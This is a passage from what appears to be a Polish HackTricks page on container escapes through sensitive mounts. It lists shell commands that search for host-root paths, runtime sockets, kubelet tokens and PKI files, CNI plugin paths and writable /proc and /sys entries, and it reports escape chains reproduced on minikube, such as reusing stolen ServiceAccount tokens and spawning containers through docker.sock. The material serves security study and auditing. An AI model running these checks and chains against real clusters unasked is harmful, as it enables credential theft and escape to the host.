Te CVE są tu istotne, ponieważ pokazują, że obsługa montowań zależy nie tylko od konfiguracji operatora. Samo środowisko uruchomieniowe również może wprowadzić warunki ucieczki wynikające z montowania.

## Kontrole

Użyj tych poleceń, aby szybko znaleźć najpoważniejsze przypadki narażenia związane z montowaniami:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Co jest tutaj interesujące:

- Root hosta, `/proc`, `/sys`, `/var` i sockety runtime to najważniejsze znaleziska.
- Zapisywalne wpisy w proc/sys często oznaczają, że montowanie udostępnia globalne dla hosta mechanizmy kontroli jądra, a nie bezpieczny widok kontenera.
- Ścieżki z zamontowanego `/var` wymagają sprawdzenia danych uwierzytelniających i sąsiednich obciążeń, a nie tylko przeglądu systemu plików.
- Katalogi stanu kubelet oraz ścieżki CNI/pluginów zasługują na taki sam priorytet jak sockety runtime, ponieważ często leżą bezpośrednio na ścieżce tworzenia podów i dystrybucji danych uwierzytelniających w węźle.

## Stan lokalnej weryfikacji

Praktyczne łańcuchy opisane na tej stronie sprawdzono na lokalnym węźle Linux minikube. Weryfikacja odtworzyła:

- dostęp do odczytu i zapisu przez tymczasowy, zapisywalny hostPath
- wykrycie tokenów ServiceAccount i zamontowanych Secrets przez `/var/lib/kubelet/pods`
- pomyślne uwierzytelnienie w Kubernetes API za pomocą aktywnego tokenu odzyskanego z tego zamontowanego stanu kubelet
- wykrycie tylko do odczytu sąsiedniego systemu plików Docker `overlay2` przez zamontowany `/var`
- utworzenie przez Docker API kontenera równorzędnego z montowaniem hosta tylko do odczytu przez zamontowany `docker.sock`
- opóźnione wykonanie na hoście za pośrednictwem tymczasowego hooka używanego przez hosta
- symulację wrappera CNI, która zachowała argumenty, standardowe wejście i wykonanie oryginalnego pluginu

Ten sam węzeł udostępniał `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` i `config.gz`, ale nie udostępniał `uevent_helper`, zmiennych EFI, wpisów termicznych ani `sched_debug`. Nie uruchamiano destrukcyjnych mechanizmów wyzwalających w jądrze. Potwierdza to, że łańcuchy obejmujące root hosta, `/var`, stan kubelet, sockety i procesy hosta można odtworzyć, natomiast techniki wykorzystujące mechanizmy pomocnicze procfs/sysfs należy uzależniać od konkretnego jądra, trybu montowania, ścieżki payloadu i mechanizmu wyzwalającego.

## References

- [1] [Lokalne pliki i ścieżki używane przez Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Kontener cilium-agent może uzyskać dostęp do hosta przez montowanie `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
